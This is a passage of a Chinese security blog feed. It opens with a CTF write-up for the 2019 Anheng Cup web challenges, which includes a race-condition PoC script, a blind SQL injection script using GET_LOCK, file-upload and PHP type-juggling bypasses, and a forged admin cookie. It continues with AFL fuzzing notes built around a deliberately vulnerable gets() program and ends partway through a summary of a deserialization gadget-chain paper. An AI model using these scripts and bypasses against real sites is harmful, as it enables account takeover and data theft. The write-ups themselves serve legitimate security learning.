verify设为1</span></span><br><span class="line">zUserFile::update_attr($username, <span class="string">'email_verify'</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h2><p>审到这里想到条件竞争，如果走正常重置邮箱的流程，程序执行到<code>zUserFile::update_attr($username, &#39;token&#39;, &#39;&#39;);</code>时，再次请求重置邮箱，由于class.user.php::validate_email()没有检查valid状态，导致新的email被写入，程序再回到<code>zUserFile::update_attr($username, &#39;email_verify&#39;, 1);</code>，那么攻击这就可以重置任意邮箱了。</p><p>梳理一下思路，也就是：</p><ol><li>注册用户验证邮箱</li><li>重置邮箱（这里邮箱还写自己的）</li><li>收到校验链接</li><li>在请求校验链接同时，再次重置邮箱为管理员邮箱（ambulong@vulnspy.com，注册界面出现过），若该步骤在比较token一致—-&gt;set(email_verify=1)中间执行，则条件竞争成功。</li></ol><p>因此有以下PoC：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">HOST = <span class="string">"http://114.55.36.69:8023"</span></span><br><span class="line">VERIFY_URL = <span class="string">"/verify.php?token=7lGBgYOtvxoW7mRHdsGEFJqr6YMDIJjD&amp;username=admin1"</span></span><br><span class="line">SESSION=<span class="string">"h5evpbu7eclfe0kpfe3fad01q1"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_verify</span><span class="params">()</span>:</span></span><br><span class="line">    res = requests.get(HOST + VERIFY_URL)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_email</span><span class="params">()</span>:</span></span><br><span class="line">    burp0_url = HOST + <span class="string">"/chgemail.php?token=JaX1dpl3"</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">"PHPSESSID"</span>: SESSION&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">"email"</span>: <span class="string">"ambulong@vulnspy.com"</span>, <span class="string">"submit"</span>: <span class="string">"Submit"</span>&#125;</span><br><span class="line">    res=requests.post(</span><br><span class="line">        burp0_url,</span><br><span class="line">        cookies=burp0_cookies,</span><br><span class="line">        data=burp0_data)</span><br><span class="line">    print(res.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = threading.Thread(target=send_verify, args=())</span><br><span class="line">    t2 = threading.Thread(target=reset_email, args=())</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line">    t1.join()</span><br><span class="line">    t2.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    poc()</span><br></pre></td></tr></table></figure><p>运行后看到邮箱被修改，切换用户就能拿到flag了</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571219028911.png" alt="1571219028911"></p><h1 id="奇怪的恐龙特性"><a href="#奇怪的恐龙特性" class="headerlink" title="奇怪的恐龙特性"></a>奇怪的恐龙特性</h1><p>PHP特性，</p><ol><li><p>参数名为A.A会转变为A_A，</p></li><li><p>数组&gt;inf</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196679531.png" alt="1571196679531"></p></li><li><p>数组转换成字符串时会出错，因此结果==0</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571196848622.png" alt="1571196848622"></p></li></ol><p>因此有payload：<code>/?A.A[]=1</code></p><h1 id="新瓶装旧酒"><a href="#新瓶装旧酒" class="headerlink" title="新瓶装旧酒"></a>新瓶装旧酒</h1><p>73-81行需要传一个合法zip文件，无法绕过：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211251759.png" alt="1571211251759"></p><p>接着，92-105行解压zip，并且移动到upload目录下：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211484309.png" alt="1571211484309"></p><p>要求zip中存在图片后缀的文件，并且不包含”.ph”字符，可以通过”x.pHp.jpg”绕过，上传成功：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571211770075.png" alt="1571211770075"></p><h1 id="sleepcms"><a href="#sleepcms" class="headerlink" title="sleepcms"></a>sleepcms</h1><p>敏感路径扫描，发现<code>/robots.txt</code>泄露，打开发现提示</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571199573631.png" alt="1571199573631"></p><p>以及注入点 <code>/article.php?id=2</code></p><p>跑黑名单，发现select、sleep和benchmark都banned，解法是通过GET_LOCK</p><blockquote><p>GET_LOCK(str,timeout)<br>Tries to obtain a lock with a name given by the string str, using a timeout of timeout seconds. A negative timeout value means infinite timeout. The lock is exclusive. While held by one session, other sessions cannot obtain a lock of the same name.</p></blockquote><p>因此尝试<code>/article.php?id=2&#39; and (get_lock(&#39;vvvv&#39;,10)) #</code>可以成功延时，注意到同表做列查询时不需要用select，因此有如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sleepcms</span><span class="params">()</span>:</span></span><br><span class="line">    base_url = <span class="string">"http://114.55.36.69:8007/article.php?id="</span></span><br><span class="line">    dic = string.ascii_letters+string.digits+string.punctuation</span><br><span class="line">    flag = <span class="string">""</span></span><br><span class="line">    cur = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">"1'/**/and/**/(if(substr(content,&#123;pos&#125;,1)='&#123;char&#125;',get_lock('nonce',3),0))/**/#"</span></span><br><span class="line">            url = base_url+urllib.parse.quote(payload.format(pos=cur,char=i))</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ConnectTimeout:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> requests.exceptions.ReadTimeout:</span><br><span class="line">                flag += str(i)</span><br><span class="line">                cur += <span class="number">1</span></span><br><span class="line">                print(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    sleepcms()</span><br></pre></td></tr></table></figure><p>运行得到flag：<code>flagis{Flag{C221e22A28b933f103f0f88caB68b79b}}</code>，改成小写提交最里面括号的内容</p><h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><p>要求<code>$_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;] &amp;&amp; md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;])</code>，强网杯原题，参考<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">如何用不同的数值构建一样的MD5</a>。</p><p>指定param1和param2相同的开头，这里以”1”为例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1&gt;init.txt</span><br></pre></td></tr></table></figure><p>接着使用fastcoll生成具有相同md5的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">λ fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</span><br><span class="line">MD5 collision generator v1.5</span><br><span class="line">by Marc Stevens (http://www.win.tue.nl/hashclash/)</span><br><span class="line"></span><br><span class="line">Using output filenames: <span class="string">'1.txt'</span> and <span class="string">'2.txt'</span></span><br><span class="line">Using prefixfile: <span class="string">'init.txt'</span></span><br><span class="line">Using initial value: b012cf77f9677e37eea923017fc5e83e</span><br><span class="line"></span><br><span class="line">Generating first block: ..</span><br><span class="line">Generating second block: S00....</span><br><span class="line">Running time: 0.641 s</span><br></pre></td></tr></table></figure><p>将1.txt和2.txt内容进行编码后发送即可的得到flag。</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571140925389.png" alt="1571140925389"></p><p>提供代码方便复现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// $text1=$_POST["data1"];</span></span><br><span class="line"><span class="comment">// $text2=$_POST["data2"];</span></span><br><span class="line"></span><br><span class="line">$text1=readmyfile(<span class="string">"1.txt"</span>);</span><br><span class="line">$text2=readmyfile(<span class="string">"2.txt"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD51: '</span>. md5($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode($text1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode ($text1));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'MD52: '</span>.md5($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode($text2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode($text2));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="简单的md5"><a href="#简单的md5" class="headerlink" title="简单的md5"></a>简单的md5</h1><p>访问网站源代码，看到提示：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131147272.png" alt="1571131147272"></p><p>实际上是说，<code>md5($_POST[&#39;data1&#39;])!=md5($_POST[&#39;data2&#39;])</code>，由于没用全等，用<code>0e</code>绕过即可：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571131226817.png" alt="1571131226817"></p><h1 id="秘密的系统"><a href="#秘密的系统" class="headerlink" title="秘密的系统"></a>秘密的系统</h1><h2 id="0x01-信息泄露"><a href="#0x01-信息泄露" class="headerlink" title="0x01 信息泄露"></a>0x01 信息泄露</h2><p>首先，dirsearch发现泄露.idea/workspace.xml文件：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192815365.png" alt="1571192815365"></p><p>workspace发现更多的文件：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571192935874.png" alt="1571192935874"></p><p>php文件未必能访问，看<code>/web/robots.txt</code>:</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193047923.png" alt="1571193047923"></p><p>访问<code>/web/index.php?r=site/loginuser_1</code>发现有一段注释：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193204265.png" alt="1571193204265"></p><p>到Github搜索关键词，能看到更多的提示：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193458794.png" alt="1571193458794"></p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193530702.png" alt="1571193530702"></p><h2 id="0x02-反序列化垂直越权"><a href="#0x02-反序列化垂直越权" class="headerlink" title="0x02 反序列化垂直越权"></a>0x02 反序列化垂直越权</h2><p>看提示大概是要用反序列化做垂直越权了：</p><p>先抓包登录，然后cookie字段被塞了一个cib字段</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571193790173.png" alt="1571193790173"></p><p>考虑到注释里面，sign需要的id，name都是可控的，伪造一个admin的cookie</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="number">1</span>;</span><br><span class="line">$username=<span class="string">"admin"</span>;</span><br><span class="line">$sign = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">'id'</span>=&gt;$id,</span><br><span class="line">                    <span class="string">'name'</span>=&gt;$username,</span><br><span class="line">                    <span class="string">'sign'</span>=&gt;md5($id.$username),</span><br><span class="line">                );</span><br><span class="line"><span class="keyword">echo</span> serialize($sign);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($sign));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到身份已经成管理员了：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194732400.png" alt="1571194732400"></p><p>加一条replace给浏览器用：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571194913710.png" alt="1571194913710"></p><h2 id="0x03-上传绕过"><a href="#0x03-上传绕过" class="headerlink" title="0x03 上传绕过"></a>0x03 上传绕过</h2><p>直接上传.php会被ban，考虑到其容器用的Apache/2.2.15，存在解析漏洞，故上传“.php.jpg”</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195205154.png" alt="1571195205154"></p><p>flag在根目录下：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571195383816.png" alt="1571195383816"></p><h1 id="game"><a href="#game" class="headerlink" title="game"></a>game</h1><p>打开页面是一个贪吃蛇游戏，js写的：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197503720.png" alt="1571197503720"></p><p><code>/js/game.js</code>代码审计，看到一串颜文字：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197561706.png" alt="1571197561706"></p><p>console运行，返回假flag，跟进去看匿名函数，得到flag：</p><p><img src="/ctf-2019“安恒杯”WEB安全测试秋季练习题wp/1571197802703.png" alt="1571197802703"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li>2019安恒杯Web安全测试大赛练习赛writeup，<a href="http://flag0.com/2019/09/27/2019安恒杯Web安全测试大赛练习赛Writeup/" target="_blank" rel="noopener">http://flag0.com/2019/09/27/2019%E5%AE%89%E6%81%92%E6%9D%AFWeb%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E5%A4%A7%E8%B5%9B%E7%BB%83%E4%B9%A0%E8%B5%9BWriteup/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AFL试用笔记</title>
      <link href="/fuzz-AFL%E8%AF%95%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/fuzz-AFL%E8%AF%95%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="AFL"><a href="#AFL" class="headerlink" title="AFL"></a>AFL</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="程序插桩-amp-编译"><a href="#程序插桩-amp-编译" class="headerlink" title="程序插桩&amp;编译"></a>程序插桩&amp;编译</h2><p>有问题程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> login[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">char</span> passwd[<span class="number">32</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Login: \n"</span>);</span><br><span class="line">    gets(login);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Password: \n"</span>);</span><br><span class="line">    gets(passwd);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(login, <span class="string">"root"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(passwd, <span class="string">"1qazxsw2"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Access Granted.\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Access Denied.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -fno-stack-protector -z execstack vuln1.c -o vuln1</span><br></pre></td></tr></table></figure><p>如果用make需要设置环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/gittup/binutils</span><br><span class="line"><span class="built_in">export</span> CC=afl-gcc</span><br><span class="line"><span class="built_in">export</span> CXX=afl-g++</span><br></pre></td></tr></table></figure><h2 id="准备输入种子"><a href="#准备输入种子" class="headerlink" title="准备输入种子"></a>准备输入种子</h2><p>创建输入输出目录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir testcases results</span><br></pre></td></tr></table></figure><p>在testcases下建立以下三个文件，AFL会读取每个文件的内容，将每一行输入到vuln1的标准输入中。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| test1.txt | test2.txt | test3.txt |</span><br><span class="line">| --------- | --------- | --------- |</span><br><span class="line">| a         | root      | root      |</span><br><span class="line">| a         | a         | 1qazxsw2  |</span><br></pre></td></tr></table></figure></p><h3 id="种子精简"><a href="#种子精简" class="headerlink" title="种子精简"></a>种子精简</h3><p><strong>afl-cmin工具</strong>需要一个给定的包含可能的（potential）test case的文件夹，然后运行每一个并将收到的反馈与所有其他的test case进行对比，找到最有效地表示最unique的代码路径的最好的test case。最好的test case被保存到一个新的目录。</p><p> <strong>afl-tmin工具</strong>只用于一个指定的文件。当我们进行fuzzing时，我们不想浪费CPU来处理一些相对于test case表示代码路径来说无用的bit或byte。为了使每一个test case达到表示与原始测试用例相同的代码路径所需的最小值，afl-tmin遍历test case的实际字节，逐步删除很小的数据块，直到删除任意字节都会影响到代码路径表示。</p><h2 id="启动AFL"><a href="#启动AFL" class="headerlink" title="启动AFL"></a>启动AFL</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core &gt; /proc/sys/kernel/core_pattern <span class="comment"># WSL不需要</span></span><br><span class="line">afl-fuzz -i ./testcases/ -o ./results/ ./vuln1</span><br></pre></td></tr></table></figure><p>如果程序通过参数读取文件，可以用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i afl_in -o afl_out ./binutils/readelf -a @@</span><br></pre></td></tr></table></figure></p><p>出现以下界面</p><p><img src="/fuzz-AFL试用笔记/1567758115844.png" alt="1567758115844"></p><h2 id="查看crash"><a href="#查看crash" class="headerlink" title="查看crash"></a>查看crash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ls results/crashes/ -al</span><br><span class="line">total 4</span><br><span class="line">drwx------ 1 root root 512 Sep  6 16:22 .</span><br><span class="line">drwxrwxrwx 1 root root 512 Sep  6 16:21 ..</span><br><span class="line">-rw------- 1 root root 611 Sep  6 16:21 fuzz-AFL试用笔记.txt</span><br><span class="line">-rw------- 1 root root 137 Sep  6 16:21 id:000000,sig:11,src:000000,op:havoc,rep:64</span><br><span class="line">-rw------- 1 root root  65 Sep  6 16:22 id:000001,sig:11,src:000002,op:havoc,rep:128</span><br></pre></td></tr></table></figure><p>查看一个测试用例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat results/crashes/id:000000,sig:11,src:000000,op:havoc,rep:64</span><br></pre></td></tr></table></figure></p><h1 id="kelinci"><a href="#kelinci" class="headerlink" title="kelinci"></a>kelinci</h1><h2 id="AFL端"><a href="#AFL端" class="headerlink" title="AFL端"></a>AFL端</h2><p>一个C程序作为接口，它与afl-gcc/g++编译出来的程序相同，将AFL的输入通过TCP发送给Java，再将执行结果返回返回给afl。在<code>fuzzerside/</code>下用<code>make</code>编译</p><h2 id="JAVA端"><a href="#JAVA端" class="headerlink" title="JAVA端"></a>JAVA端</h2><p>用于包装fuzz对象，建立一个TCP服务器，返回退出代码和路径信息。它在<code>instrumentor/</code>目录下用<code>gradle build</code>构建</p>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Automated Discovery of Deserialization Gadget Chain解读</title>
      <link href="/deserialize-AutoFindPOP/"/>
      <url>/deserialize-AutoFindPOP/</url>
      
        <content type="html"><![CDATA[<p>文章来自Automated Discovery of Deserialization Gadget Chains, Blackhat2018</p><p>文章：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf</a></p><a id="more"></a><p>演讲视频：<a href="https://www.youtube.com/watch?v=wPbW6zQ52w8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wPbW6zQ52w8</a> </p><p>工具：<a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><h1 id="原理介绍"><a href="#原理介绍" class="headerlink" title="原理介绍"></a>原理介绍</h1><p>看下来的感觉就是将jar包里的（可以反序列化的）所有类的属性设为污点（因为反序列化时攻击者都可以控制），接下来做污点传播，Source为toString()，equals()等方法，Sink为Runtime.exec()，Method.invoke()，URL.openStream等方法，而污点清除函数就是黑名单类中的所有函数。</p><h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>枚举包内的所有类和方法，对于类收集其父类和子类集合：</p><p><img src="/deserialize-AutoFindPOP/1566118462274.png" alt="1566118462274"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">List&lt;ClassReference&gt; discoveredClasses</span><br><span class="line">ClassReference(name, superClass, interfaces isInterface, members)</span><br><span class="line">ClassReference.Handle(name)</span><br><span class="line">List&lt;MethodReference&gt; discoveredMethod</span><br><span class="line">MethodReference(classReference, name, desc, isStatic)</span><br><span class="line">MethodReference.Handle(classReference, name, desc)</span><br><span class="line">InheritanceMap //记录了一个类的父类和子类集合，因为一个类拥有其父类的所有方法</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap</span><br><span class="line">Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap</span><br></pre></td></tr></table></figure><h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>发现函数传递的数据流，如代码段1中invoke可以传递对象value(0)，代码段2中invoke既可以传递arg(1)也可以传递value(0)，因为我们假设（a）受污染的对象中，所有成员变量都是受污染的（b）程序中所有分支都是可达的（污染传播都是这样做的），0和1为参数index，0代表this。在此之前要先分析函数调用关系，因为如果有A函数：<code>FuncA(){return FuncB();}</code>，那么A函数的返回与B函数有关。</p><p><img src="/deserialize-AutoFindPOP/1566118415853.png" alt="1566118415853"></p><p>output:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow</span><br><span class="line">MethodReferenceHandle(classReference, name, desc)</span><br><span class="line">Set&lt;Integer&gt; // 返回一系列污点 0表示this，1为arg1</span><br></pre></td></tr></table></figure><h2 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h2><p>构建调用图，即函数A将自身参数arg1传递给函数B的参数arg2 FuncA@1-&gt;FuncB@2</p><p><img src="/deserialize-AutoFindPOP/1566118496226.png" alt="1566118496226"></p><p>Output: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;GraphCall&gt; discoveredCalls</span><br><span class="line">GraphCall(caller.Method, targetMethod, callerArgIndex, callerargPath, targetArgIndex)</span><br><span class="line">// 调用函数, 被调函数, 